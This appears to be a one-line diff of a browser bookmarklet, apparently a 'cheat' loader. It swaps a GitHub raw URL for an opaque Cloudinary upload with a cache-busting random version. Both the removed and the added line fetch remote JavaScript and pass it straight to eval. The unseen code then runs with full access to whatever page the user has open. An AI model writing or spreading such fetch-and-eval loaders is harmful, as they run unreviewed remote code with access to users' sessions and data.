@@ -1,1 +1,1 @@
-javascript:fetch("https://raw.githubusercontent.com/marcos10pc/expansao-noturna-cheeto/refs/heads/main/imisstheoldkanye.js").then(SKIBIDI_RIZZ=>SKIBIDI_RIZZ.text()).then(eval);
+javascript:fetch(`https://res.cloudinary.com/dcwnwmtgc/raw/upload/v${Math.floor(Math.random() * 1000000)}/zxay141rf6uw3wwzea35.txt`).then(r => r.text()).then(r => eval(r));
